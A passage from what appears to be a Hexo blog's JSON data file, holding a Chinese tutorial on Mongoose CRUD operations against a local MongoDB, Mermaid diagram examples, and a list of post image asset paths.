class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 1.下载 npm init -y &amp; npm i mongoose -S</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 2.引入 mongoose</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> mongoose = <span class=\"built_in\">require</span>(<span class=\"string\">'mongoose'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 4.监听mongoDB数据库的连接状态</span></span><br><span class=\"line\">mongoose.connection.once(<span class=\"string\">'open'</span>, () =&gt; &#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"string\">'成功连接到 mongoDB 数据库'</span>)</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\">mongoose.connection.once(<span class=\"string\">'close'</span>, () =&gt; &#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"string\">'断开 mongoDB 数据库'</span>)</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 3.连接数据库</span></span><br><span class=\"line\"><span class=\"comment\">// mongoose.connect('mongodb://数据库ip地址:端口号(默认：27017)/数据库名')</span></span><br><span class=\"line\">mongoose.connect(</span><br><span class=\"line\">  <span class=\"string\">'mongodb://127.0.0.1/test'</span>,</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    useNewUrlParser: <span class=\"literal\">true</span>,</span><br><span class=\"line\">    useUnifiedTopology: <span class=\"literal\">true</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  (err, db) =&gt; &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'连接数据库成功'</span>)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// mongoose 断开连接</span></span><br><span class=\"line\"><span class=\"comment\">// mongoose.disconnect()</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 定义一个schema</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> Schema = mongoose.Schema</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// model模型</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> stuSchema = <span class=\"keyword\">new</span> Schema(&#123;</span><br><span class=\"line\">  name: <span class=\"built_in\">String</span>,</span><br><span class=\"line\">  age: <span class=\"built_in\">Number</span>,</span><br><span class=\"line\">  gender: &#123;</span><br><span class=\"line\">    type: <span class=\"built_in\">String</span>,</span><br><span class=\"line\">    <span class=\"keyword\">default</span>: <span class=\"string\">'female'</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  address: <span class=\"built_in\">String</span></span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 创建一个 model -&gt; collection # mogoose.model(modelName, schema)</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> StuModel = mongoose.model(<span class=\"string\">'stus'</span>, stuSchema)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 测试：创建一个文档插入到数据库中</span></span><br><span class=\"line\"><span class=\"comment\">// StuModel.create(&#123;</span></span><br><span class=\"line\"><span class=\"comment\">//   name: 'houfei',</span></span><br><span class=\"line\"><span class=\"comment\">//   age: 25,</span></span><br><span class=\"line\"><span class=\"comment\">//   gender: 'male',</span></span><br><span class=\"line\"><span class=\"comment\">//   address: '河北'</span></span><br><span class=\"line\"><span class=\"comment\">// &#125;, err =&gt; &#123;</span></span><br><span class=\"line\"><span class=\"comment\">//   if(!err) console.log('插入成功')</span></span><br><span class=\"line\"><span class=\"comment\">//   else console.log('插入失败')</span></span><br><span class=\"line\"><span class=\"comment\">// &#125;)</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"Model的API\"><a href=\"#Model的API\" class=\"headerlink\" title=\"Model的API\"></a>Model的API</h3><p><strong>document 是 model 的实例</strong></p>\n<h4 id=\"插入\"><a href=\"#插入\" class=\"headerlink\" title=\"插入\"></a>插入</h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// StuModel.create(object1, object2, ..., (err, object1, object2, ...) = &gt; &#123; &#125;)</span></span><br><span class=\"line\"><span class=\"comment\">// StuModel.create(array, (err, array) = &gt; &#123; &#125;)</span></span><br><span class=\"line\">StuModel.create(</span><br><span class=\"line\">  [&#123;</span><br><span class=\"line\">    name: <span class=\"string\">'liming'</span>,</span><br><span class=\"line\">    age: <span class=\"number\">23</span>,</span><br><span class=\"line\">    gender: <span class=\"string\">'male'</span>,</span><br><span class=\"line\">    address: <span class=\"string\">'安徽'</span></span><br><span class=\"line\">  &#125;], (err, array) =&gt; &#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(array)</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(!err) <span class=\"built_in\">console</span>.log(<span class=\"string\">'插入成功'</span>)</span><br><span class=\"line\">  <span class=\"keyword\">else</span> <span class=\"built_in\">console</span>.log(<span class=\"string\">'插入失败'</span>)</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n<h4 id=\"查询数据\"><a href=\"#查询数据\" class=\"headerlink\" title=\"查询数据\"></a>查询数据</h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * filter 查询条件</span></span><br><span class=\"line\"><span class=\"comment\"> * projection 投影</span></span><br><span class=\"line\"><span class=\"comment\"> * options 查询选项 skip limit</span></span><br><span class=\"line\"><span class=\"comment\"> * callback 回调函数</span></span><br><span class=\"line\"><span class=\"comment\">  Model.find(filter, [projection], [options], [callback])</span></span><br><span class=\"line\"><span class=\"comment\">  Model.findById()</span></span><br><span class=\"line\"><span class=\"comment\">  Model.findByIdAndDelete()</span></span><br><span class=\"line\"><span class=\"comment\">  Model.findByIdAndRemove()</span></span><br><span class=\"line\"><span class=\"comment\">  Model.findByIdAndUpdate()</span></span><br><span class=\"line\"><span class=\"comment\">  Model.findOne()</span></span><br><span class=\"line\"><span class=\"comment\">  Model.findOneAndDelete()</span></span><br><span class=\"line\"><span class=\"comment\">  Model.findOneAndRemove()</span></span><br><span class=\"line\"><span class=\"comment\">  Model.findOneAndReplace()</span></span><br><span class=\"line\"><span class=\"comment\">  Model.findOneAndUpdate()</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 在 StuModel 查询 name 为 jack，并且 age 大于 22的所有array文档，并且只显示 name age 属性，不显示 _id 属性， array并且要跳过 skip 第一条数据</span></span><br><span class=\"line\">StuModel.find(&#123; <span class=\"attr\">name</span>: <span class=\"string\">'jack'</span>, <span class=\"attr\">age</span>: &#123; <span class=\"attr\">$gte</span>: <span class=\"number\">22</span> &#125; &#125;, <span class=\"string\">'name age -_id'</span>, &#123; <span class=\"attr\">skip</span>: <span class=\"number\">1</span> &#125;, (err, docs) =&gt; &#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(docs)</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(!err) <span class=\"built_in\">console</span>.log(<span class=\"string\">'查询成功'</span>)</span><br><span class=\"line\">  <span class=\"keyword\">else</span> <span class=\"built_in\">console</span>.log(<span class=\"string\">'查询失败'</span>)</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">StuModel.findOne(&#123; <span class=\"attr\">age</span>: &#123; <span class=\"attr\">$gte</span>: <span class=\"number\">19</span> &#125; &#125;, <span class=\"string\">'name age -_id'</span>, &#123;&#125;, (err, doc) =&gt; &#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(doc)</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(!err) <span class=\"built_in\">console</span>.log(<span class=\"string\">'查询成功'</span>)</span><br><span class=\"line\">  <span class=\"keyword\">else</span> <span class=\"built_in\">console</span>.log(<span class=\"string\">'查询失败'</span>)</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">StuModel.findById(<span class=\"string\">'5ee9f47cf67607ea5eda6894'</span>, <span class=\"string\">'name'</span>, &#123; &#125;, (err, doc) =&gt; &#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(doc <span class=\"keyword\">instanceof</span> StuModel)</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(!err) <span class=\"built_in\">console</span>.log(<span class=\"string\">'查询成功'</span>)</span><br><span class=\"line\">  <span class=\"keyword\">else</span> <span class=\"built_in\">console</span>.log(<span class=\"string\">'查询失败'</span>)</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n<h4 id=\"更新数据\"><a href=\"#更新数据\" class=\"headerlink\" title=\"更新数据\"></a>更新数据</h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">Model.updateMany(filter, doc, [options], [callback])</span></span><br><span class=\"line\"><span class=\"comment\">Model.updateOne(filter, doc, [options], [callback])</span></span><br><span class=\"line\"><span class=\"comment\">Model.replaceOne(filter, doc, [options], [callback])</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"></span><br><span class=\"line\">StuModel.updateOne(&#123;<span class=\"attr\">name</span>: <span class=\"string\">\"houfei\"</span>&#125;, &#123;</span><br><span class=\"line\">  $<span class=\"keyword\">set</span>: &#123;</span><br><span class=\"line\">    age: <span class=\"number\">1</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;, &#123;<span class=\"attr\">multi</span>: <span class=\"literal\">false</span>&#125;, (err, status) =&gt; &#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(status)</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(!err) <span class=\"built_in\">console</span>.log(<span class=\"string\">'修改成功'</span>)</span><br><span class=\"line\">  <span class=\"keyword\">else</span> <span class=\"built_in\">console</span>.log(<span class=\"string\">'修改失败'</span>)</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n<h4 id=\"删除数据\"><a href=\"#删除数据\" class=\"headerlink\" title=\"删除数据\"></a>删除数据</h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">Model.deleteMany(conditions, [options], [callback])</span></span><br><span class=\"line\"><span class=\"comment\">Model.deleteOne(conditions, [options], [callback])</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"></span><br><span class=\"line\">StuModel.deleteOne(&#123;<span class=\"attr\">name</span>: <span class=\"string\">\"houfei\"</span>&#125;, (err, state) =&gt; &#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(state)</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(!err) <span class=\"built_in\">console</span>.log(<span class=\"string\">'删除成功'</span>)</span><br><span class=\"line\">  <span class=\"keyword\">else</span> <span class=\"built_in\">console</span>.log(<span class=\"string\">'删除失败'</span>)</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n<h3 id=\"Document的API\"><a href=\"#Document的API\" class=\"headerlink\" title=\"Document的API\"></a>Document的API</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 创建 Document 对象</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> stu = <span class=\"keyword\">new</span> StuModel(&#123;</span><br><span class=\"line\">  name: <span class=\"string\">'李白'</span>,</span><br><span class=\"line\">  age: <span class=\"number\">30</span>,</span><br><span class=\"line\">  gender: <span class=\"string\">'female'</span>,</span><br><span class=\"line\">  address: <span class=\"string\">'四川'</span></span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n<h4 id=\"doc-save\"><a href=\"#doc-save\" class=\"headerlink\" title=\"doc.save()\"></a><a href=\"https://mongoosejs.com/docs/api/document.html#document_Document-save\" target=\"_blank\" rel=\"noopener\">doc.save()</a></h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 保存方法 save</span></span><br><span class=\"line\">stu.save(<span class=\"function\">(<span class=\"params\">err, state</span>) =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(state)</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(!err) <span class=\"built_in\">console</span>.log(<span class=\"string\">'添加成功'</span>)</span><br><span class=\"line\">  <span class=\"keyword\">else</span> <span class=\"built_in\">console</span>.log(<span class=\"string\">'添加失败'</span>)</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n<h4 id=\"doc-update\"><a href=\"#doc-update\" class=\"headerlink\" title=\"doc.update()\"></a><a href=\"https://mongoosejs.com/docs/api/document.html#document_Document-update\" target=\"_blank\" rel=\"noopener\">doc.update()</a></h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">StuModel.findOne(&#123;&#125;, (error, doc) =&gt; &#123;</span><br><span class=\"line\">  <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">   * Document.prototype.update(doc, options, callback)</span></span><br><span class=\"line\"><span class=\"comment\">   * doc «Object»</span></span><br><span class=\"line\"><span class=\"comment\">   * options «Object»</span></span><br><span class=\"line\"><span class=\"comment\">   * callback «Function»</span></span><br><span class=\"line\"><span class=\"comment\">   */</span></span><br><span class=\"line\">  doc.update(&#123;<span class=\"attr\">$set</span>: &#123;</span><br><span class=\"line\">    age: <span class=\"number\">1</span></span><br><span class=\"line\">  &#125;&#125;,(err, status) =&gt; &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(status)</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!err) <span class=\"built_in\">console</span>.log(<span class=\"string\">'修改成功'</span>)</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"built_in\">console</span>.log(<span class=\"string\">'修改失败'</span>)</span><br><span class=\"line\">  &#125;)</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n<h4 id=\"doc-get-set-id\"><a href=\"#doc-get-set-id\" class=\"headerlink\" title=\"doc.get()|.set()|id\"></a><a href=\"https://mongoosejs.com/docs/api/document.html#document_Document-get\" target=\"_blank\" rel=\"noopener\">doc.get()|.set()|id</a></h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">StuModel.findOne(&#123;&#125;, (error, doc) =&gt; &#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(doc.id)</span><br><span class=\"line\">  doc.get(<span class=\"string\">'address'</span>, <span class=\"built_in\">String</span>)</span><br><span class=\"line\">  doc.set(<span class=\"string\">'age'</span>, <span class=\"number\">99</span>)</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n<h4 id=\"doc-toJSON-toObject\"><a href=\"#doc-toJSON-toObject\" class=\"headerlink\" title=\"doc.toJSON()|toObject\"></a><a href=\"https://mongoosejs.com/docs/api/document.html#document_Document-toJSON\" target=\"_blank\" rel=\"noopener\">doc.toJSON()|toObject</a></h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">StuModel.findOne(&#123;&#125;, (error, doc) =&gt; &#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> a = doc.toJSON()</span><br><span class=\"line\">  <span class=\"keyword\">let</span> b = doc.toObject()</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(a, b)</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n<h3 id=\"Mongoose模块化\"><a href=\"#Mongoose模块化\" class=\"headerlink\" title=\"Mongoose模块化\"></a>Mongoose模块化</h3><p><a href=\"https://www.bilibili.com/video/BV1Lb411V7rv?p=19\" target=\"_blank\" rel=\"noopener\"> 视频地址</a></p>\n<h3 id=\"拓展甘特图\"><a href=\"#拓展甘特图\" class=\"headerlink\" title=\"拓展甘特图\"></a>拓展甘特图</h3><p><a href=\"https://mermaid-js.github.io/mermaid/#/README\" target=\"_blank\" rel=\"noopener\">GitHub guide</a></p>\n<h4 id=\"流程图\"><a href=\"#流程图\" class=\"headerlink\" title=\"流程图\"></a><a href=\"https://mermaid-js.github.io/mermaid/#/README?id=flowchart\" target=\"_blank\" rel=\"noopener\">流程图</a></h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">graph TD;</span><br><span class=\"line\">    A--&gt;B;</span><br><span class=\"line\">    A--&gt;C;</span><br><span class=\"line\">    B--&gt;D;</span><br><span class=\"line\">    C--&gt;D;</span><br></pre></td></tr></table></figure>\n<h4 id=\"顺序图\"><a href=\"#顺序图\" class=\"headerlink\" title=\"顺序图\"></a><a href=\"https://mermaid-js.github.io/mermaid/#/README?id=sequence-diagram\" target=\"_blank\" rel=\"noopener\">顺序图</a></h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sequenceDiagram</span><br><span class=\"line\">    participant Alice</span><br><span class=\"line\">    participant Bob</span><br><span class=\"line\">    Alice-&gt;&gt;John: Hello John, how are you?</span><br><span class=\"line\">    loop Healthcheck</span><br><span class=\"line\">        John-&gt;&gt;John: Fight against hypochondria</span><br><span class=\"line\">    end</span><br><span class=\"line\">    Note right of John: Rational thoughts &lt;br/&gt;prevail!</span><br><span class=\"line\">    John--&gt;&gt;Alice: Great!</span><br><span class=\"line\">    John-&gt;&gt;Bob: How about you?</span><br><span class=\"line\">    Bob--&gt;&gt;John: Jolly good!</span><br></pre></td></tr></table></figure>\n<h4 id=\"甘特图\"><a href=\"#甘特图\" class=\"headerlink\" title=\"甘特图\"></a><a href=\"https://mermaid-js.github.io/mermaid/#/README?id=gantt-diagram\" target=\"_blank\" rel=\"noopener\">甘特图</a></h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gantt</span><br><span class=\"line\">dateFormat  YYYY-MM-DD</span><br><span class=\"line\">title Adding GANTT diagram to mermaid</span><br><span class=\"line\">excludes weekdays 2014-01-10</span><br><span class=\"line\"></span><br><span class=\"line\">section A section</span><br><span class=\"line\">Completed task            :done,    des1, 2014-01-06,2014-01-08</span><br><span class=\"line\">Active task               :active,  des2, 2014-01-09, 3d</span><br><span class=\"line\">Future task               :         des3, after des2, 5d</span><br><span class=\"line\">Future task2               :         des4, after des3, 5d</span><br></pre></td></tr></table></figure>\n<h4 id=\"其他一\"><a href=\"#其他一\" class=\"headerlink\" title=\"其他一\"></a>其他一</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">graph LR</span><br><span class=\"line\">    A(开始) --&gt;B(起床)</span><br><span class=\"line\">    B --天气不好--- C&gt;干活]</span><br><span class=\"line\">    C ==&gt; D&#123;休息时间到了&#125;</span><br><span class=\"line\">    D -.yes.-&gt; E((休息))</span><br><span class=\"line\">    D -.no.-&gt; C</span><br><span class=\"line\">    E --&gt; F(吃饭)</span><br></pre></td></tr></table></figure>\n<h4 id=\"其他二\"><a href=\"#其他二\" class=\"headerlink\" title=\"其他二\"></a>其他二</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sequenceDiagram</span><br><span class=\"line\">对象A-&gt;&gt;对象B:中午吃什么？</span><br><span class=\"line\">对象B-&gt;&gt;对象A: 随便</span><br><span class=\"line\">loop 思考</span><br><span class=\"line\">    对象A-&gt;对象A: 努力搜索</span><br><span class=\"line\">end</span><br><span class=\"line\">对象A--&gt;&gt;对象B: 火锅？</span><br><span class=\"line\">对象B-&gt;&gt;对象A: 可以</span><br><span class=\"line\">Note left of 对象A: 我是一个对象A</span><br><span class=\"line\">Note right of 对象B: 我是一个对象B</span><br><span class=\"line\">participant 对象C</span><br><span class=\"line\">Note over 对象C: 我自己说了算</span><br></pre></td></tr></table></figure>\n<h4 id=\"其他三\"><a href=\"#其他三\" class=\"headerlink\" title=\"其他三\"></a>其他三</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gantt</span><br><span class=\"line\">        dateFormat  YYYY-MM-DD</span><br><span class=\"line\">        title 软件开发甘特图</span><br><span class=\"line\">        section 设计</span><br><span class=\"line\">        需求:done,des1, 2019-01-06,2019-01-08</span><br><span class=\"line\">        原型:active,des2, 2019-01-09, 3d</span><br><span class=\"line\">        UI设计:des3, after des2, 5d</span><br><span class=\"line\">        未来任务:des4, after des3, 5d</span><br><span class=\"line\"></span><br><span class=\"line\">        section 开发</span><br><span class=\"line\">        学习准备理解需求:crit, done, 2019-01-06,24h</span><br><span class=\"line\">        设计框架:crit, done, after des2, 2d</span><br><span class=\"line\">        开发:crit, active, 3d</span><br><span class=\"line\">        未来任务:crit, 5d</span><br><span class=\"line\">        休息时间:2d</span><br><span class=\"line\"></span><br><span class=\"line\">        section 测试</span><br><span class=\"line\">        功能测试:active, a1, after des3, 3d</span><br><span class=\"line\">        压力测试:after a1, 20h</span><br><span class=\"line\">        测试报告: 48h</span><br></pre></td></tr></table></figure>\n"}],"PostAsset":[{"_id":"source/_posts/RN基础入门/FlatList.gif","slug":"FlatList.gif","post":"ckclr4u250000qrwtdxh4szlf","modified":0,"renderable":0},{"_id":"source/_posts/SCSS/案例实战.gif","slug":"案例实战.gif","post":"ckclr4u2d0001qrwt23zvu2rx","modified":0,"renderable":0},{"_id":"source/_posts/WXMiniProgram/微信小程序的生命周期.png","slug":"微信小程序的生命周期.png","post":"ckclr4u2k0004qrwt93x2s3ao","modified":0,"renderable":0},{"_id":"source/_posts/js中的原型及原型链/prototype.jpg","slug":"prototype.jpg","post":"ckclr4u350006qrwtv7tt9ysr","modified":0,"renderable":0},{"_id":"source/_posts/XSS攻击/111.gif","slug":"111.gif","post":"ckclr4u2r0005qrwtlb74a49x","modified":0,"renderable":0},{"_id":"source/_posts/XSS攻击/1562307165857.png","slug":"1562307165857.png","post":"ckclr4u2r0005qrwtlb74a49x","modified":0,"renderable":0},{"_id":"source/_posts/XSS攻击/asc-1562308830171.gif","slug":"asc-1562308830171.gif","post":"ckclr4u2r0005qrwtlb74a49x","modified":0,"renderable":0},{"_id":"source/_posts/XSS攻击/asc.gif","slug":"asc.gif","post":"ckclr4u2r0005qrwtlb74a49x","modified":0,"renderable":0},{"_id":"source/_posts/XSS攻击/loading.gif","slug":"loading.gif","post":"ckclr4u2r0005qrwtlb74a49x","modified":0,"renderable":0},{"_id":"source/_posts/XSS攻击/loadinga-1562307323724.gif","slug":"loadinga-1562307323724.gif","post":"ckclr4u2r0005qrwtlb74a49x","modified":0,"renderable":0},{"_id":"source/_posts/XSS攻击/loadinga.gif","slug":"loadinga.gif","post":"ckclr4u2r0005qrwtlb74a49x","modified":0,"renderable":0},{"_id":"source/_posts/RN基础入门/ScrollView.gif","slug":"ScrollView.gif","post":"ckclr4u250000qrwtdxh4szlf","modified":0,"renderable":0},{"_id":"source/_posts/RN基础入门/SectionList.gif","slug":"SectionList.gif","post":"ckclr4u250000qrwtdxh4szlf","modified":0,"renderable":0},{"_id":"source/_posts/RN基础入门/image-20200326151248022.png","slug":"image-20200326